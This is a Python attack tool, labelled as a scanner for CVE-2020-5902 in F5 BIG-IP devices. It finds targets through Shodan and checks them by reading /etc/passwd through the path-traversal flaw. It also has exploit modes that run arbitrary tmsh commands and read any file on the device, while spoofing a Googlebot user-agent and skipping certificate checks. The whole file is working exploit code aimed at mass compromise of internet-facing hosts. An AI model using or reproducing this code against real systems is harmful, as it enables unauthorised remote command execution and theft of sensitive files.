import argparse
import urllib.request
import urlopen
import ssl
from OpenSSL import SSL
import shodan
from socket import socket
from colorama import Fore, Back, Style

SHODAN_API_KEY = "YOUR API KEY HERE"
api = shodan.Shodan(SHODAN_API_KEY)

def checkSSL(ip, port):
	sock = socket()
	
	try:
		sock.connect((ip, port))
	except Exception:
		print(Fore.RED+"[!] "+ip+" Connection error"+Style.RESET_ALL)
		return False
	
	ctx = SSL.Context(SSL.SSLv23_METHOD)
	ctx.check_hostname = False
	ctx.verify_mode = SSL.VERIFY_NONE
	
	try:
		sock_ssl = SSL.Connection(ctx, sock)
		sock_ssl.set_connect_state()
		sock_ssl.do_handshake()
		return True
	except Exception:
		return False

def shodanSearch():

	print('Searching for hosts in Shodan -')
	print('===============================')
	try:
			# Search Shodan
			results = api.search('http.title:"BIG-IP&reg;- Redirect"')

			# Show the results
			storeOldIp = ''
			for result in results['matches']:
					if storeOldIp==result['ip_str']:
						continue
					
					verifyVulnHost(result['ip_str'], 443)
					storeOldIp = result['ip_str']
					
	except shodan.APIError as e:
			print(Fore.RED+Back.WHITE+'Error: {}'.format(e))	

def verifyVulnHost(hostip, hostport):

	if hostport!="443":
		target = "https://"+hostip+":"+str(hostport)+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
	else:
		target = "https://"+hostip+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"

	context = ssl.create_default_context()
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	
	text = b'root'

	headers = {}
	headers['User-Agent'] = "Googlebot"

	request = urllib.request.Request(target,headers=headers)
	
	if checkSSL(hostip.rstrip('\n'), hostport):
		try:
			response = urllib.request.urlopen(request, context=context)
			with response as res:
				if text in res.read():
					print(Fore.RED+Back.WHITE+"[+] "+hostip.rstrip('\n')+" vulnerable"+Style.RESET_ALL)
				else:
					print(Fore.GREEN+"[-] "+hostip.rstrip('\n')+" not vulnerable"+Style.RESET_ALL)

				response.close()
		except urllib.error.URLError as e:
			print("[-] "+hostip.rstrip('\n')+" error "+str(e.code))
		except Exception:
			print("[!] "+hostip.rstrip('\n')+" Unknown error")

	else:
		print("[!] "+hostip+" SSL Error")
		storeOldIp = hostip


def verifyVulnHostsList(file):

	with open(file, 'r+') as f:
		for hostip in f:			
			target = "https://"+hostip.rstrip('\n')+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"

			context = ssl.create_default_context()
			context.check_hostname = False
			context.verify_mode = ssl.CERT_NONE

			text = b'root'

			headers = {}
			headers['User-Agent'] = "Googlebot"

			request = urllib.request.Request(target,headers=headers)
			
			try:
				response = urllib.request.urlopen(request, context=context)
				with response as res:
					#print(res.read())
					if text in res.read():
						print(Fore.RED+Back.WHITE+"[+] "+hostip.rstrip('\n')+" vulnerable"+Style.RESET_ALL)
						
					else:
						print(Fore.GREEN+"[-] "+hostip.rstrip('\n')+" not vulnerable"+Style.RESET_ALL)

					response.close()
			except urllib.error.URLError as e:
				print("[-] "+hostip.rstrip('\n')+" error "+str(e.code))
			except urllib.error.HTTPError as h:
				print("[-] "+hostip.rstrip('\n')+" error "+str(h))

def exploitHost(hostip, hostport, command):

	if hostport!="443":
		target = "https://"+hostip+":"+str(hostport)+"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command="+command.replace(" ","+")
	else:
		target = "https://"+hostip+"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command="+command.replace(" ","+")

	context = ssl.create_default_context()
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	
	text = b'root'

	headers = {}
	headers['User-Agent'] = "Googlebot"

	request = urllib.request.Request(target,headers=headers)
	
	if checkSSL(hostip.rstrip('\n'), hostport):
		try:
			response = urllib.request.urlopen(request, context=context)
			with response as res:
				print(res.read())
				response.close()
		except urllib.error.URLError as e:
			print("[-] "+hostip.rstrip('\n')+" error "+str(e.code))
		except Exception:
			print("[!] "+hostip.rstrip('\n')+" Unknown error")

	else:
		print("[!] "+hostip+" SSL Error")
		storeOldIp = hostip

def exploitHostLFI(hostip, hostport, lfi):

	if hostport!="443":
		target = "https://"+hostip+":"+str(hostport)+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName="+lfi
	else:
		target = "https://"+hostip+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName="+lfi

	context = ssl.create_default_context()
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	
	text = b'root'

	headers = {}
	headers['User-Agent'] = "Googlebot"

	request = urllib.request.Request(target,headers=headers)
	
	if checkSSL(hostip.rstrip('\n'), hostport):
		try:
			response = urllib.request.urlopen(request, context=context)
			with response as res:
				print(res.read())
				response.close()
		except urllib.error.URLError as e:
			print("[-] "+hostip.rstrip('\n')+" error "+str(e.code))
		except Exception:
			print("[!] "+hostip.rstrip('\n')+" Unknown error")

	else:
		print("[!] "+hostip+" SSL Error")
		storeOldIp = hostip


def main():
	parser = argparse.ArgumentParser(prog='f5Scan', formatter_class=argparse.RawDescriptionHelpFormatter, description='''
	F5 BIG IP Scanner for CVE-2020-5902 by bt0
	https://www.github.com/halencarjunior

	More information about the Vulnerability:
	https://support.f5.com/csp/article/K52145254?sf235665517=1
	''')
	parser.add_argument('-H', '--host', type=str, help='IP or Hostname of target')
	parser.add_argument('-p', '--port', type=int, help='Port of target. Default=443', default='443')
	#parser.add_argument('-a', '--all', action='store_true', help='Use all options')
	parser.add_argument('-hl', '--hostlist' , help='Use a hosts list e.g. ./hosts.txt')
	parser.add_argument('-s', '--shodan' , action="store_true", help='Search for hosts in Shodan (Needs api key)')
	
	parser.add_argument('-e', '--exploit', action="store_true", help='exploit target')
	parser.add_argument('-c', '--command', type=str, help='command to execute')

	parser.add_argument('-lf', '--lfi', type=str, help='File to read using LFI Vulnerability')
	
	parser.add_argument('--version', action='version', version='%(prog)s 1.0')
	args = parser.parse_args()

	banner = '''
	F5 BIG IP Scanner for CVE-2020-5902 by bt0
	v. 1.0
	==========================================\n'''

	hostip = args.host
	hostport = args.port

	if args.host and args.exploit and args.command:
		exploitcommand = args.command
		exploitHost(hostip,hostport,exploitcommand)

	if args.host and args.exploit and args.lfi:
		exploitlfi = args.lfi
		exploitHostLFI(hostip,hostport,exploitlfi)

	if args.host and not args.exploit:
		print(banner)
		print("Scanning using -H (by host)\n")
		verifyVulnHost(hostip,hostport)
	elif args.hostlist:
		print(banner)
		print("Scanning using -hl (by hosts list)\n")
		file = args.hostlist
		verifyVulnHostsList(file)
	elif args.shodan:
		if SHODAN_API_KEY == "YOUR API KEY HERE":
			print(banner)
			print(Fore.RED+Back.WHITE+"[!] Shodan API KEY is not configured. Change variable to scan using your shodan api"+Style.RESET_ALL)
		else:
			print(banner)
			shodanSearch()

if __name__ == '__main__':
   main()